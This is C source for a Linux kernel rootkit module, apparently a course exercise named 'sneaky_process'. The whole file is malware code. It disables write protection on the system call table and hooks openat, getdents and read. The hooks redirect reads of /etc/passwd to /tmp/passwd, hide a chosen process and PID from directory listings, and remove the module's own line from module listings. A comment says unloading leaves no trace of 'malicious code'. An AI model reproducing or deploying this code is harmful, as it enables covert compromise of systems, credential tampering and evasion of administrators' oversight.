#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#define PREFIX "sneaky_process"

struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
};
typedef struct linux_dirent linux_dirent_t; 

static char* pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "pid of sneaky module");

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

/**********************************************************************************************
 * sneaky function definition
 * 
 **********************************************************************************************/
/* -------------------- openat -------------------- */

// asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int (*original_openat)(const char *pathname, int flags);

// Define your new sneaky version of the 'openat' syscall
// asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
// {
//   return (*original_openat)(regs);
// }

asmlinkage int sneaky_sys_openat(const char *pathname, int flags) {
  if(strcmp(pathname, "/etc/passwd") == 0){
    const char* tmpPasswdPath = "/tmp/passwd";
    copy_to_user((void*)pathname, tmpPasswdPath, strlen(tmpPasswdPath));
  }
  return original_openat(pathname, flags);
}

/* -------------------- getdents -------------------- */
/**
 * @brief functor to original getdents64
 * 
 */
asmlinkage int(*original_getdents64)(unsigned int fd, struct linux_dirent* dirp, unsigned int count);

/**
 * @brief sneaky getdents64
 * 
 * @param fd 
 * @param dirp 
 * @param count 
 * @return number of bytes read 
 */
asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent* dirp, unsigned int count){
  int totalDirpLength = original_getdents64(fd, dirp, count);
 
  int curr = 0;
  while(curr < totalDirpLength){
    linux_dirent_t* dirpTemp = (void*)dirp + curr;

    if(strcmp(dirpTemp->d_name, "sneaky_process") == 0 || strcmp(dirpTemp->d_name, pid) == 0){
      int reclen = dirpTemp->d_reclen;
      int lenToBeCopied = ((void*)dirp + totalDirpLength) - ((void*)dirpTemp + reclen);
      void* source = (void*)dirpTemp + reclen;
      memmove(dirpTemp, source, lenToBeCopied);
      totalDirpLength -= reclen;
    }
    else{
      curr += dirpTemp->d_reclen;
    }
  }
  return totalDirpLength;
}

/* -------------------- read -------------------- */
/**
 * @brief functor to original read
 * 
 */
asmlinkage ssize_t (*original_read)(int fd, void* buf, size_t count);

/**
 * @brief sneaky read
 * 
 * @param fd 
 * @param buf 
 * @param count 
 * @return number of bytes read
 */
asmlinkage ssize_t sneaky_sys_read(int fd, void* buf, size_t count){
  ssize_t bytesRead = original_read(fd, buf, count);
  if(bytesRead > 0){
    void* posStart = strstr(buf, "sneaky_mod");
    if(posStart != NULL){
      void* posEnd = strstr(posStart, "\n");
      if(posEnd != NULL){
        int size = posEnd - posStart + 1;
        memmove(posStart, posEnd + 1, bytesRead - (posStart - buf) - size);
        bytesRead -= size;
      }
    }
  }
  return bytesRead;
}

/**********************************************************************************************
 * kernel backbone
 * 
 **********************************************************************************************/
// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void*)sys_call_table[__NR_openat];
  original_getdents64 = (void*)sys_call_table[__NR_getdents];
  original_read = (void*)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");